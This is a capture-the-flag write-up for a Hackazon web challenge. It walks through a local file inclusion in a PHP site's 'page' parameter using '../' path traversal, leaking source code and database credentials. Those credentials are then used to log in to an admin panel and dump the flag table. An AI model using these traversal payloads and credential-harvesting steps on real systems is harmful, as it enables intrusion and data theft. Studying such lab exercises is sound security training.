## WEB550 - Database

By clicking the menu link, we get a route https://71fb1303c76a0ab6cc6890256c1e743e.challenge.hackazon.org/index.php?page=menu. Since page is a parameter we control, we can tamper around with it and exploit a Local File Inclusion vulnerability by visiting https://71fb1303c76a0ab6cc6890256c1e743e.challenge.hackazon.org/index.php?page=../index. This gives us the following source code:

````
dbConnect(); $this->siteConfig(); $this->render(); } function dbConnect() { // connect to database $cfg = include("db.inc.php"); $this->db = new PDO($cfg['db_dsn'], $cfg['db_user'], $cfg['db_pass']); $this->db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC); } function siteConfig() { // get site configuration $select = $this->db->query('SELECT k,v FROM config'); foreach ($select->fetchAll() as $entry) { extract($entry); $GLOBALS[$k] = $$k = unserialize($v); } // in maintenance? if ($maintenance_mode) { header("content-type: text/plain"); print $maintenance_text; exit; } } function render() { // load/parse page $page = (string) @$_GET['page'] ?: "home"; include("pages/template_top.php"); readfile("pages/${page}.php"); readfile("pages/template_bottom.php"); } function __destruct() { $this->db = null; file_put_contents($this->logfile, $GLOBALS['log_visitor_entry']); } } new Website;
````

For later challenges, we can note that the LFI comes from the code line `readfile("pages/${page}.php");`. Looking at the code  `$cfg = include("db.inc.php");`, we can visit https://71fb1303c76a0ab6cc6890256c1e743e.challenge.hackazon.org/index.php?page=../db.inc to get the following source code as well:

````
'mysql:dbname=pizzeria;host=127.0.0.1', 'db_user' => 'website_ro', 'db_pass' => 'PizzaNoPineapple!' ];
````

With this in hand, we can visit https://71fb1303c76a0ab6cc6890256c1e743e.challenge.hackazon.org/pma/ to reach a PhpMiniAdmin dashboard and log on to the database dashboard. Here we can dump the contents of a the database to find a table called config where the flag among more data is stored.